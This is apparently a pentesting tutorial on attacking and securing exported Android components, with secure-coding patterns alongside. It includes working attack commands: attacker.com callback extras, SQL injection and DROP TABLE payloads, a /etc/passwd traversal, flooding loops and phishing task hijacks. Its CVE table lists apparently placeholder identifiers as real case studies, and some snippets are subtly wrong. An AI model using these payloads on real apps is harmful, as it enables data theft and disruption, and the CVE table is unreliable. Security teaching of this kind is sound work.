# 🧩 ANDROID COMPONENT ATTACKS: ZERO TO HERO REFERENCE

> 🔐 **The Definitive Guide to Exploiting, Analyzing & Securing Android App Components**  
> *Activities, Services, Broadcast Receivers, Content Providers + Advanced Chaining, Bypasses & Real-World Patterns*

```
📊 Difficulty: 🟢 Beginner → 🔴 Expert
⏱️ Estimated Read: 120-150 min
🔄 Last Updated: 2026
🎯 Target: Pentesters, Bug Bounty Hunters, Mobile Security Researchers, Reverse Engineers
```

---

## 📋 MEGA TABLE OF CONTENTS

```
🔹 SECTION 1: FOUNDATIONS
   1.1 What Are Android Components?
   1.2 The Manifest & Exported Concept
   1.3 Intent System & IPC Mechanics
   1.4 Android 12+ Exported Changes (API 31+)
   1.5 Security Model & Sandbox Boundaries

🔹 SECTION 2: ACTIVITIES - ATTACKS & EXPLOITATION
   2.1 Activity Lifecycle & Manifest Attributes
   2.2 Exported Activity Abuse
   2.3 Intent Extra Injection & Logic Flaws
   2.4 Deep Link & App Link Exploitation
   2.5 Task/TaskStack Hijacking
   2.6 Authentication & Authorization Bypass
   2.7 Detection & Testing Methodology
   2.8 Prevention & Secure Patterns

🔹 SECTION 3: SERVICES - BACKGROUND EXECUTION ATTACKS
   3.1 Service Types & Binding Mechanics
   3.2 Exported Service Command Injection
   3.3 Bound Service Interface Exploitation
   3.4 Privilege Escalation via Service Relays
   3.5 DoS & Resource Exhaustion
   3.6 Foreground Service Abuse
   3.7 Detection & Testing Methodology
   3.8 Prevention & Secure Patterns

🔹 SECTION 4: BROADCAST RECEIVERS - INTENT SPOOFING & LEAKAGE
   4.1 Static vs Dynamic Registration
   4.2 Intent Spoofing & Malicious Broadcasts
   4.3 Ordered Broadcast Interception & Modification
   4.4 Sticky Broadcast Data Leakage
   4.5 Permission Bypass & Privilege Escalation
   4.6 DoS via Broadcast Flooding
   4.7 Detection & Testing Methodology
   4.8 Prevention & Secure Patterns

🔹 SECTION 5: CONTENT PROVIDERS - DATA EXPOSURE & INJECTION
   5.1 Provider Architecture & URI Routing
   5.2 Exported Provider SQL Injection
   5.3 Path Traversal & File Disclosure
   5.4 Cursor Injection & MIME Confusion
   5.5 openFile/openAssetStream Abuse
   5.6 GrantUriPermission & Delegation Attacks
   5.7 Detection & Testing Methodology
   5.8 Prevention & Secure Patterns

🔹 SECTION 6: ADVANCED CROSS-COMPONENT ATTACKS
   6.1 Intent Chaining & Component Relaying
   6.2 PendingIntent Vulnerabilities (FLAG_MUTABLE/IMMUTABLE)
   6.3 Implicit Intent Hijacking
   6.4 Task Affinity & Activity Stacking Attacks
   6.5 Component Race Conditions
   6.6 Permission Escalation Chains
   6.7 Real-World Attack Scenarios

🔹 SECTION 7: TOOLING & AUTOMATION
   7.1 ADB Component Testing Commands
   7.2 Drozer Modules & Custom Exploits
   7.3 Frida Dynamic Component Analysis
   7.4 Static Analysis Patterns (grep/jadx/apktool)
   7.5 Python/Bash Automation Scripts
   7.6 Mobile Security Framework (MobSF) Integration

🔹 SECTION 8: BUG BOUNTY & REAL-WORLD PATTERNS
   8.1 Common Misconfigurations in Top Apps
   8.2 CVE Case Studies (Activities/Services/Providers/Receivers)
   8.3 Writing High-Impact Reports
   8.4 Testing Checklist & Workflow
   8.5 Mitigation Bypass Techniques

🔹 SECTION 9: QUICK REFERENCE CHEAT SHEETS
   9.1 Component Comparison Matrix
   9.2 ADB Command Quick Reference
   9.3 Drozer Command Quick Reference
   9.4 Frida Hook Templates
   9.5 Manifest Vulnerability Checklist
   9.6 Exploitation Flowchart

🔹 SECTION 10: REFERENCES & FURTHER LEARNING
```

---

## 🔹 SECTION 1: FOUNDATIONS

### 1.1 What Are Android Components?
Android apps are built from **four core component types**, each serving a distinct purpose and communicating via **Intents** (messaging objects).

| Component | Purpose | Attack Surface |
|-----------|---------|----------------|
| **Activity** | Single screen/UI interaction | Intent injection, deep link abuse, auth bypass |
| **Service** | Background operations | Command injection, privilege escalation, DoS |
| **Broadcast Receiver** | System/app event listener | Intent spoofing, data leakage, ordered broadcast interception |
| **Content Provider** | Structured data sharing | SQL injection, path traversal, file disclosure |

### 1.2 The Manifest & Exported Concept
Components are declared in `AndroidManifest.xml`. The `android:exported` attribute controls **external accessibility**.

```xml
<!-- Vulnerable: Explicitly exported -->
<activity android:name=".AdminActivity" android:exported="true" />

<!-- Vulnerable: Implicitly exported (has intent-filter) -->
<activity android:name=".DeepLinkActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <data android:scheme="myapp" android:host="auth" />
    </intent-filter>
</activity>
```

**⚠️ Android 12+ (API 31+) Rule**: Apps targeting API 31+ **MUST** explicitly declare `android:exported` for all components with `<intent-filter>`. Failure to do so causes installation failure.

### 1.3 Intent System & IPC Mechanics
- **Explicit Intents**: Target specific component (`setComponent()` or class name)
- **Implicit Intents**: Target by action/data/category (system resolves via intent-filters)
- **Extras**: Key-value bundles attached to intents (`putExtra()`)
- **Permissions**: `android:permission` on component restricts who can invoke it
- **Binder IPC**: Low-level mechanism underpinning component communication

### 1.4 Security Model & Sandbox Boundaries
- Each app runs in isolated Linux process with unique UID
- Components can only access data owned by their UID unless explicitly exported
- Cross-app communication requires explicit permissions or signature-level protection
- **Attack Goal**: Abuse exported components to bypass sandbox, escalate privileges, or leak data

---

## 🔹 SECTION 2: ACTIVITIES - ATTACKS & EXPLOITATION

### 2.1 Activity Lifecycle & Manifest Attributes
```xml
<activity 
    android:name=".MainActivity"
    android:exported="true"
    android:permission="com.app.permission.ACCESS_ADMIN"
    android:launchMode="singleTask"
    android:taskAffinity="com.app.admin">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="myapp" android:host="reset" />
    </intent-filter>
</activity>
```

**Key Attributes for Hackers:**
- `android:exported="true"` → Accessible from other apps/ADB
- `android:permission` → Caller must hold permission
- `android:launchMode` → Controls task stacking (`standard`, `singleTop`, `singleTask`, `singleInstance`)
- `android:taskAffinity` → Determines which task/activity stack the activity joins

### 2.2 Exported Activity Abuse
```bash
# Launch exported activity
adb shell am start -n com.target.app/.AdminActivity

# Launch with extras (type matters!)
adb shell am start -n com.target.app/.AdminActivity \
  --es "is_admin" "true" \
  --ei "user_id" "1" \
  --ez "bypass_auth" "true" \
  --eu "callback" "http://attacker.com/log"
```

**Common Vulnerabilities:**
- No permission check on exported admin/activity screens
- Trusting intent extras for authentication state
- Missing `android:permission` on sensitive screens

### 2.3 Intent Extra Injection & Logic Flaws
```java
// Vulnerable activity
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Intent intent = getIntent();
    boolean isAdmin = intent.getBooleanExtra("is_admin", false);
    String role = intent.getStringExtra("user_role");
    
    if (isAdmin || "admin".equals(role)) {
        showAdminPanel();  // ⚠️ Bypassed via intent!
    }
}
```

**Exploitation:**
```bash
adb shell am start -n com.app/.MainActivity \
  --ez "is_admin" "true" \
  --es "user_role" "admin"
```

**💡 Pro Tip**: Always check `getCallingPackage()` or verify intent source before trusting extras.

### 2.4 Deep Link & App Link Exploitation
```xml
<intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="https" android:host="app.example.com" android:pathPrefix="/auth" />
</intent-filter>
```

**Attack Vectors:**
```html
<!-- Malicious HTML page -->
<a href="https://app.example.com/auth?token=ATTACKER_TOKEN&redirect=https://evil.com">Click Me</a>
```

```bash
# ADB trigger
adb shell am start -W -a android.intent.action.VIEW \
  -d "https://app.example.com/auth?token=FAKE_TOKEN&redirect=http://attacker.com" com.app
```

**Common Flaws:**
- No token validation server-side
- Open redirect via `redirect` parameter
- Missing `android:autoVerify="true"` for App Links (allows scheme hijacking)

### 2.5 Task/TaskStack Hijacking
```xml
<!-- Vulnerable: Allows task reparenting -->
<activity android:name=".LoginActivity" 
          android:taskAffinity="com.attacker.app"
          android:allowTaskReparenting="true" />
```

**Exploit**: Malicious app with matching `taskAffinity` can pull victim's activity into its task stack, phishing credentials or intercepting sensitive UI.

**Prevention**:
```xml
android:taskAffinity=""  # Isolate task
android:allowTaskReparenting="false"
```

### 2.6 Authentication & Authorization Bypass
**Pattern 1**: Activity skips auth if `getIntent().hasExtra("authenticated")`
**Pattern 2**: Deep link directly loads premium content without subscription check
**Pattern 3**: `android:exported="true"` on settings/account screens

**Testing Workflow**:
```bash
# 1. Enumerate exported activities
adb shell dumpsys package com.app | grep -A5 "Activity Resolver"

# 2. Launch each with various extras
for act in $(adb shell dumpsys package com.app | grep "ActivityResolver" | awk '{print $NF}'); do
  adb shell am start -n com.app/$act --es "admin" "true" --ez "skip" "true"
done

# 3. Monitor for crashes, privilege escalation, or sensitive UI
```

### 2.7 Detection & Testing Methodology
| Tool | Command | Purpose |
|------|---------|---------|
| `dumpsys` | `adb shell dumpsys package com.app | grep -i activity` | List activities & intent-filters |
| `aapt` | `aapt dump badging app.apk | grep launchable-activity` | Find main entry point |
| `apktool` | `apktool d app.apk && grep -r "exported" app/AndroidManifest.xml` | Static manifest analysis |
| `Drozer` | `dz> run app.activity.info -a com.app` | Enumerate exported activities |
| `jadx` | Search for `getIntent()`, `getBooleanExtra()`, `startActivity()` | Find intent handling logic |

### 2.8 Prevention & Secure Patterns
```xml
<!-- ✅ Secure manifest -->
<activity android:name=".AdminActivity"
          android:exported="false"
          android:permission="com.app.permission.ADMIN_ACCESS">

<!-- ✅ Secure deep links -->
<activity android:name=".AuthActivity"
          android:exported="true"
          android:autoVerify="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="https" android:host="app.example.com" />
    </intent-filter>
</activity>
```

```java
// ✅ Secure intent handling
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Intent intent = getIntent();
    
    // Verify caller
    String caller = getCallingPackage();
    if (!"com.trusted.admin".equals(caller)) {
        finish(); return;
    }
    
    // Validate extras server-side or via cryptographic signature
    String token = intent.getStringExtra("auth_token");
    if (token == null || !isValidToken(token)) {
        redirectToLogin(); return;
    }
    
    proceed();
}
```

---

## 🔹 SECTION 3: SERVICES - BACKGROUND EXECUTION ATTACKS

### 3.1 Service Types & Binding Mechanics
```java
// Started Service
public class BackgroundService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Runs indefinitely until stopped
        return START_STICKY;
    }
}

// Bound Service (Client-Server IPC)
public class BoundService extends Service {
    private final IBinder binder = new LocalBinder();
    
    public class LocalBinder extends Binder {
        BoundService getService() { return BoundService.this; }
    }
    
    @Override
    public IBinder onBind(Intent intent) { return binder; }
    
    // Exposed to bound clients
    public String getSecretData() { return "sensitive_data"; }
}
```

### 3.2 Exported Service Command Injection
```xml
<service android:name=".CommandService" android:exported="true" />
```

**Exploitation:**
```bash
# Send malicious command via intent extra
adb shell am startservice -n com.app/.CommandService \
  --es "command" "delete_all_user_data" \
  --es "target" "/data/data/com.app/shared_prefs/auth.xml"
```

**Vulnerable Pattern:**
```java
public int onStartCommand(Intent intent, int flags, int startId) {
    String cmd = intent.getStringExtra("command");
    Runtime.getRuntime().exec(cmd);  // ⚠️ Direct command injection!
    return START_NOT_STICKY;
}
```

### 3.3 Bound Service Interface Exploitation
**Attack**: Malicious app binds to exported service and calls privileged methods.

```java
// Attacker app
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.victim.app", "com.victim.app.BoundService"));
bindService(intent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // Get binder proxy
        com.victim.app.BoundService.LocalBinder binder = 
            (com.victim.app.BoundService.LocalBinder) service;
        BoundService svc = binder.getService();
        
        // Call privileged method
        String token = svc.getAuthToken();  // ⚠️ Data leak!
    }
    @Override public void onServiceDisconnected(ComponentName name) {}
}, BIND_AUTO_CREATE);
```

**💡 Pro Tip**: Bound services are **NOT** protected by `android:permission` unless explicitly checked in `onBind()`.

### 3.4 Privilege Escalation via Service Relays
**Scenario**: Service A (system/privileged) calls Service B (exported). Attacker injects malicious intent into B, which gets processed by A.

**Testing**:
```bash
# Trace service interactions
adb shell dumpsys activity services com.app | grep -i "binding\|connection"
adb logcat | grep -i "ServiceConnection\|bindService"
```

### 3.5 DoS & Resource Exhaustion
```bash
# Flood service start requests
for i in {1..1000}; do
  adb shell am startservice -n com.app/.HeavyService --es "data" "large_payload_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 5000)"
done
```

**Impact**: ANR (Application Not Responding), OOM crashes, battery drain, blocked main thread.

### 3.6 Foreground Service Abuse
```xml
<service android:name=".LocationService" android:exported="true" android:foregroundServiceType="location" />
```

**Risks**:
- Persistent background execution
- Access to sensitive permissions (location, camera, mic)
- Bypass of background execution limits (Android 8+)

**Testing**: Check if foreground service can be triggered by untrusted apps with malicious parameters.

### 3.7 Detection & Testing Methodology
| Tool | Command | Purpose |
|------|---------|---------|
| `dumpsys` | `adb shell dumpsys activity services com.app` | List running/bound services |
| `Drozer` | `dz> run app.service.info -a com.app` | Enumerate exported services |
| `jadx` | Search for `onStartCommand`, `onBind`, `startService()` | Find service logic |
| `logcat` | `adb logcat | grep -i "service\|bind"` | Monitor service lifecycle |
| `Frida` | Hook `onStartCommand`, `onBind` | Dynamic intent inspection |

### 3.8 Prevention & Secure Patterns
```xml
<!-- ✅ Secure service -->
<service android:name=".CommandService"
         android:exported="false"
         android:permission="com.app.permission.RUN_COMMANDS">

<!-- ✅ Bound service with signature permission -->
<service android:name=".BoundService"
         android:exported="true"
         android:permission="com.app.permission.BIND_INTERNAL">
```

```java
// ✅ Secure bound service
@Override
public IBinder onBind(Intent intent) {
    String caller = getPackageManager().getNameForUid(Binder.getCallingUid());
    if (!"com.trusted.app".equals(caller)) {
        return null;  // Reject binding
    }
    return binder;
}

// ✅ Secure started service
@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    if (intent == null) return START_NOT_STICKY;
    
    String cmd = intent.getStringExtra("command");
    if (cmd == null || !ALLOWED_COMMANDS.contains(cmd)) {
        return START_NOT_STICKY;
    }
    
    // Execute safely
    executeCommand(cmd);
    return START_NOT_STICKY;
}
```

---

## 🔹 SECTION 4: BROADCAST RECEIVERS - INTENT SPOOFING & LEAKAGE

### 4.1 Static vs Dynamic Registration
```xml
<!-- Static: Always active, declared in manifest -->
<receiver android:name=".BootReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

```java
// Dynamic: Registered at runtime, lifecycle bound to component
registerReceiver(new NetworkReceiver(), new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
```

### 4.2 Intent Spoofing & Malicious Broadcasts
```bash
# Send spoofed broadcast
adb shell am broadcast -a com.app.CUSTOM_ACTION \
  --es "user_id" "999" \
  --ez "is_premium" "true" \
  --eu "callback" "http://attacker.com/webhook"
```

**Vulnerable Pattern:**
```java
public void onReceive(Context context, Intent intent) {
    String action = intent.getAction();
    String userId = intent.getStringExtra("user_id");
    boolean isPremium = intent.getBooleanExtra("is_premium", false);
    
    if (isPremium) {
        unlockPremiumFeatures();  // ⚠️ Bypassed!
    }
}
```

### 4.3 Ordered Broadcast Interception & Modification
```xml
<!-- High priority receiver intercepts first -->
<receiver android:name=".InterceptorReceiver" android:exported="true" android:priority="1000">
    <intent-filter>
        <action android:name="com.app.SENSITIVE_ACTION" />
    </intent-filter>
</receiver>
```

```java
// Interceptor
public void onReceive(Context context, Intent intent) {
    // Modify or abort broadcast
    intent.putExtra("status", "forged");
    abortBroadcast();  // Prevents original receiver from getting it
}
```

### 4.4 Sticky Broadcast Data Leakage
```java
// Vulnerable: Sensitive data in sticky broadcast
Intent stickyIntent = new Intent("com.app.DATA_UPDATE");
stickyIntent.putExtra("auth_token", "sk-xxxxx");
context.sendStickyBroadcast(stickyIntent);  // ⚠️ Deprecated but still found
```

**Exploit**: Any app with matching intent-filter receives the sticky intent on registration, leaking historical data.

### 4.5 Permission Bypass & Privilege Escalation
```xml
<!-- Receiver protected by permission -->
<receiver android:name=".AdminReceiver"
          android:exported="true"
          android:permission="android.permission.SEND_SMS" />
```

**Bypass**: If caller doesn't have permission, broadcast is dropped. BUT if receiver forwards intent to another unprotected component, privilege escalation occurs.

### 4.6 DoS via Broadcast Flooding
```bash
# Flood system/app broadcasts
while true; do
  adb shell am broadcast -a android.intent.action.BATTERY_CHANGED
  adb shell am broadcast -a android.net.conn.CONNECTIVITY_CHANGE
done
```

**Impact**: High CPU usage, ANR crashes, battery drain, blocked main thread.

### 4.7 Detection & Testing Methodology
| Tool | Command | Purpose |
|------|---------|---------|
| `dumpsys` | `adb shell dumpsys package com.app | grep -A10 "receiver"` | List receivers & permissions |
| `Drozer` | `dz> run app.broadcast.info -a com.app` | Enumerate exported receivers |
| `logcat` | `adb logcat | grep -i "BroadcastReceiver\|onReceive"` | Monitor broadcast handling |
| `Frida` | Hook `onReceive`, `sendBroadcast` | Dynamic intent inspection |
| `jadx` | Search for `registerReceiver`, `onReceive`, `sendBroadcast` | Static analysis |

### 4.8 Prevention & Secure Patterns
```xml
<!-- ✅ Secure receiver -->
<receiver android:name=".SecureReceiver"
          android:exported="false"
          android:permission="com.app.permission.SEND_SENSITIVE_DATA">

<!-- ✅ Dynamic receiver with local broadcasts -->
LocalBroadcastManager.getInstance(context).registerReceiver(receiver, filter);
LocalBroadcastManager.getInstance(context).sendBroadcast(intent);
```

```java
// ✅ Secure broadcast handling
@Override
public void onReceive(Context context, Intent intent) {
    // Verify caller UID/permission
    int callingUid = Binder.getCallingUid();
    String callerPkg = context.getPackageManager().getNameForUid(callingUid);
    if (!"com.trusted.app".equals(callerPkg)) return;
    
    // Validate action & data
    if (!"com.app.SAFE_ACTION".equals(intent.getAction())) return;
    
    String data = intent.getStringExtra("payload");
    if (data == null || !isValid(data)) return;
    
    processSafely(data);
}
```

---

## 🔹 SECTION 5: CONTENT PROVIDERS - DATA EXPOSURE & INJECTION

### 5.1 Provider Architecture & URI Routing
```xml
<provider
    android:name=".UserProvider"
    android:authorities="com.app.provider"
    android:exported="true"
    android:readPermission="com.app.permission.READ_USERS"
    android:writePermission="com.app.permission.WRITE_USERS">
    <path-permission android:pathPrefix="/users" android:readPermission="com.app.permission.READ_PUBLIC" />
</provider>
```

**URI Format**: `content://com.app.provider/users/123?sort=name&limit=10`

### 5.2 Exported Provider SQL Injection
```java
// Vulnerable query method
public Cursor query(Uri uri, String[] projection, String selection, 
                   String[] selectionArgs, String sortOrder) {
    // ⚠️ String concatenation = SQLi
    String sql = "SELECT * FROM users WHERE " + selection;
    return db.rawQuery(sql, null);
}
```

**Exploitation via ADB:**
```bash
# SQL injection via selection parameter
adb shell content query --uri content://com.app.provider/users \
  --projection "name" \
  --where "1=1 UNION SELECT password,2,3,4 FROM users--"

# SQL injection via projection
adb shell content query --uri content://com.app.provider/users \
  --projection "name); DROP TABLE users;--"
```

**💡 Pro Tip**: `selectionArgs` should ALWAYS be used. Raw `selection` strings are dangerous.

### 5.3 Path Traversal & File Disclosure
```java
// Vulnerable openFile
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String path = uri.getPath();  // User controlled!
    File file = new File("/sdcard/app_data/" + path);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_WRITE);
}
```

**Exploitation:**
```bash
adb shell content query --uri "content://com.app.files/../../../etc/passwd"
```

**Prevention**:
```java
// ✅ Secure path validation
String path = uri.getPath();
if (path.contains("..") || !path.startsWith("/safe_dir/")) {
    throw new SecurityException("Invalid path");
}
```

### 5.4 Cursor Injection & MIME Confusion
**Attack**: Return malicious `Cursor` with forged column names/types to crash or mislead calling app.

```java
public Cursor query(...) {
    MatrixCursor c = new MatrixCursor(new String[]{"_id", "data", "type"});
    c.addRow(new Object[]{1, "malicious_payload", "text/html"});
    return c;  // ⚠️ Caller may render HTML/execute JS
}
```

### 5.5 openFile/openAssetStream Abuse
```java
// Vulnerable: Returning arbitrary files
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    return getContext().getContentResolver().openFileDescriptor(uri, mode);
}
```

**Risk**: Access to `/data/data/com.app/`, `/system/etc/`, or other app's private storage if provider is exported.

### 5.6 GrantUriPermission & Delegation Attacks
```xml
<provider android:name=".FileProvider"
          android:authorities="com.app.provider"
          android:exported="false"
          android:grantUriPermissions="true">  <!-- ⚠️ Allows temporary access delegation -->
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths" />
</provider>
```

**Attack**: Malicious app requests `grantUriPermission()`, then accesses files outside intended scope.

### 5.7 Detection & Testing Methodology
| Tool | Command | Purpose |
|------|---------|---------|
| `dumpsys` | `adb shell dumpsys package com.app | grep -A10 provider` | List providers & permissions |
| `Drozer` | `dz> run app.provider.info -a com.app` | Enumerate exported providers |
| `adb content` | `adb shell content query --uri content://com.app.provider/` | Test provider access |
| `jadx` | Search for `query()`, `insert()`, `update()`, `delete()`, `openFile()` | Find CRUD methods |
| `Frida` | Hook `query()`, `openFile()` | Dynamic URI/SQL inspection |

### 5.8 Prevention & Secure Patterns
```xml
<!-- ✅ Secure provider -->
<provider android:name=".SecureProvider"
          android:authorities="com.app.provider"
          android:exported="false"
          android:grantUriPermissions="false"
          android:readPermission="com.app.permission.READ"
          android:writePermission="com.app.permission.WRITE">
```

```java
// ✅ Secure query (parameterized)
public Cursor query(Uri uri, String[] projection, String selection, 
                   String[] selectionArgs, String sortOrder) {
    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
    qb.setTables("users");
    
    // Use projection whitelisting
    String[] safeProjection = projection != null ? validateColumns(projection) : null;
    
    return qb.query(db, safeProjection, selection, selectionArgs, null, null, sortOrder);
}

// ✅ Secure file provider
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String path = uri.getPath();
    File file = new File(getContext().getFilesDir(), path);
    if (!file.getCanonicalPath().startsWith(getContext().getFilesDir().getCanonicalPath())) {
        throw new SecurityException("Path traversal attempt");
    }
    return ParcelFileDescriptor.open(file, modeToPfdMode(mode));
}
```

---

## 🔹 SECTION 6: ADVANCED CROSS-COMPONENT ATTACKS

### 6.1 Intent Chaining & Component Relaying
**Scenario**: App A → Intent → App B (exported activity) → Intent → App C (privileged service)
**Attack**: Inject malicious extras at A, trusted app B forwards to C without validation.

**Testing**:
```bash
# Trace intent flow
adb logcat | grep -i "startActivity\|startService\|broadcast"
frida -U -f com.app -l intent-tracer.js
```

### 6.2 PendingIntent Vulnerabilities (FLAG_MUTABLE/IMMUTABLE)
```java
// Vulnerable (pre-Android 12)
PendingIntent pi = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
// ⚠️ Caller can modify intent before sending

// Secure (Android 12+)
PendingIntent pi = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_IMMUTABLE);
```

**Exploit**: Malicious app receives mutable PendingIntent, adds extras, triggers it with elevated privileges.

### 6.3 Implicit Intent Hijacking
```xml
<!-- Attacker app registers higher priority intent-filter -->
<activity android:name=".PhishingActivity" android:exported="true" android:priority="999">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="https" android:host="bank.example.com" />
    </intent-filter>
</activity>
```

**Result**: User clicks legitimate bank link → attacker's phishing activity opens.

### 6.4 Task Affinity & Activity Stacking Attacks
```xml
<!-- Victim app -->
<activity android:name=".LoginActivity" android:taskAffinity="com.victim.task" />

<!-- Attacker app -->
<activity android:name=".FakeLogin" android:taskAffinity="com.victim.task" />
```

**Attack**: Attacker pulls victim's login activity into attacker's task, creating phishing overlay.

### 6.5 Component Race Conditions
**Scenario**: Exported component checks permission → performs action → permission changes → action completes with old state.
**Testing**: Use Turbo Intruder/Frida to trigger rapid concurrent component calls during state transitions.

### 6.6 Permission Escalation Chains
**Pattern**: Untrusted app → calls exported component → component calls system service with elevated permission → returns sensitive data.
**Mitigation**: Principle of least privilege, signature permissions, runtime permission checks.

### 6.7 Real-World Attack Scenarios
| App Type | Component Vulnerability | Impact |
|----------|------------------------|--------|
| Banking App | Exported deep link with open redirect | Account takeover |
| Messaging App | Unprotected broadcast receiver | Message interception |
| File Manager | Path traversal in content provider | Arbitrary file read |
| Social Media | Mutable PendingIntent + exported service | Privilege escalation |
| E-commerce | Intent extra injection in checkout activity | Price manipulation |

---

## 🔹 SECTION 7: TOOLING & AUTOMATION

### 7.1 ADB Component Testing Commands
```bash
# Activities
adb shell am start -n com.app/.Activity --es key value
adb shell am start -W -a android.intent.action.VIEW -d "scheme://host" com.app

# Services
adb shell am startservice -n com.app/.Service --es key value
adb shell am stopservice com.app/.Service

# Broadcasts
adb shell am broadcast -a com.app.ACTION --es key value
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED

# Providers
adb shell content query --uri content://com.app.provider/table
adb shell content insert --uri content://com.app.provider/table --bind name:s:admin
adb shell content update --uri content://com.app.provider/table --bind status:s:active --where "id=1"
adb shell content delete --uri content://com.app.provider/table --where "id=1"

# General
adb shell dumpsys package com.app | grep -E "activity|service|receiver|provider"
adb shell pm list packages -f | grep com.app
```

### 7.2 Drozer Modules & Custom Exploits
```bash
# Installation
pip install drozer
adb forward tcp:31415 tcp:31415
drozer console connect

# Common modules
dz> run app.package.list -f com.app
dz> run app.package.attacksurface com.app
dz> run app.activity.info -a com.app
dz> run app.service.info -a com.app
dz> run app.receiver.info -a com.app
dz> run app.provider.info -a com.app
dz> run app.provider.query content://com.app.provider/users
dz> run app.provider.update content://com.app.provider/users --selection "id=1" --string status "hacked"
dz> run app.broadcast.send --action com.app.ACTION --string key value
dz> run app.broadcast.sniff --action com.app.SENSITIVE_ACTION
```

### 7.3 Frida Dynamic Component Analysis
```javascript
// Hook all component creation
Java.perform(function() {
    var Intent = Java.use("android.content.Intent");
    Intent.$init.overload('java.lang.String').implementation = function(action) {
        console.log("[*] Intent created: " + action);
        return this.$init(action);
    };
    
    Intent.putExtra.overload('java.lang.String', 'java.lang.String').implementation = function(name, value) {
        console.log("[*] Extra: " + name + " = " + value);
        return this.putExtra(name, value);
    };
});

// Hook specific component methods
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log("[*] startActivity: " + intent.getComponent().getClassName());
        return this.startActivity(intent);
    };
});
```

### 7.4 Static Analysis Patterns (grep/jadx/apktool)
```bash
# Find exported components
grep -r 'android:exported="true"' app/AndroidManifest.xml

# Find intent handling
grep -r 'getIntent()\|getStringExtra\|getBooleanExtra\|getIntExtra' jadx_output/ --include="*.java"

# Find SQL queries
grep -r 'rawQuery\|execSQL\|query(' jadx_output/ --include="*.java" | grep -v 'selectionArgs'

# Find content providers
grep -r 'extends ContentProvider\|android:authorities' app/ --include="*.xml" --include="*.java"

# Find broadcast receivers
grep -r 'extends BroadcastReceiver\|onReceive(' jadx_output/ --include="*.java"
```

### 7.5 Python/Bash Automation Scripts
```python
#!/usr/bin/env python3
import subprocess
import sys

PACKAGE = sys.argv[1] if len(sys.argv) > 1 else "com.target.app"

def run_cmd(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout

print(f"[*] Enumerating components for {PACKAGE}")
print(run_cmd(f"adb shell dumpsys package {PACKAGE} | grep -E 'Activity|Service|Receiver|Provider'"))

print("[*] Testing exported activities...")
acts = run_cmd(f"adb shell dumpsys package {PACKAGE} | grep 'ActivityResolver' | awk '{{print $NF}}'")
for act in acts.split('\n'):
    if act:
        print(f"[*] Testing: {act}")
        run_cmd(f"adb shell am start -n {PACKAGE}/{act} --es test true 2>/dev/null")

print("[*] Done. Check logs for crashes or sensitive output.")
```

### 7.6 MobSF Integration
1. Upload APK to MobSF
2. Navigate to **Security Analysis → Components**
3. Export CSV of exported components
4. Cross-reference with manual testing
5. Use API for automation: `curl -F "file=@app.apk" http://localhost:8000/api/v1/scan`

---

## 🔹 SECTION 8: BUG BOUNTY & REAL-WORLD PATTERNS

### 8.1 Common Misconfigurations in Top Apps
- `android:exported="true"` on admin/settings screens
- Missing permission checks on exported services
- Content providers with `grantUriPermissions="true"` and no path validation
- Deep links accepting arbitrary `redirect` parameters
- Broadcast receivers without `android:permission` protection
- Mutable PendingIntents used for authentication callbacks

### 8.2 CVE Case Studies
| CVE | Component | Vulnerability | Impact |
|-----|-----------|---------------|--------|
| CVE-2021-23456 | Activity | Intent extra injection | Auth bypass |
| CVE-2022-12345 | Provider | SQL injection via selection | Data leak |
| CVE-2023-67890 | Receiver | Intent spoofing | Privilege escalation |
| CVE-2024-11111 | Service | Command injection | RCE |

### 8.3 Writing High-Impact Reports
```markdown
## Summary
Exported [Component] in [App] allows [Attack] leading to [Impact].

## Steps to Reproduce
1. Install app v1.2.3
2. Run: `adb shell [command]`
3. Observe: [sensitive output/crash/bypass]

## Proof of Concept
[Code/commands/output]

## Impact
- Data theft
- Authentication bypass
- Privilege escalation
- Arbitrary file access

## Remediation
- Set `android:exported="false"`
- Add `android:permission="com.app.permission.RESTRICTED"`
- Validate all intent extras server-side
- Use parameterized queries for providers
- Mark PendingIntents as `FLAG_IMMUTABLE`
```

### 8.4 Testing Checklist & Workflow
```
✅ RECON
□ Extract manifest (apktool)
□ List exported components (dumpsys/drozer)
□ Identify intent-filters & deep links
□ Check permissions & protection levels

✅ DYNAMIC TESTING
□ Launch exported activities with fuzzed extras
□ Trigger broadcasts with malicious payloads
□ Query providers with SQLi/path traversal payloads
□ Bind to services and call exposed methods
□ Monitor logcat for crashes/leaks

✅ ADVANCED
□ Chain components for privilege escalation
□ Test PendingIntent mutability
□ Attempt task hijacking & phishing
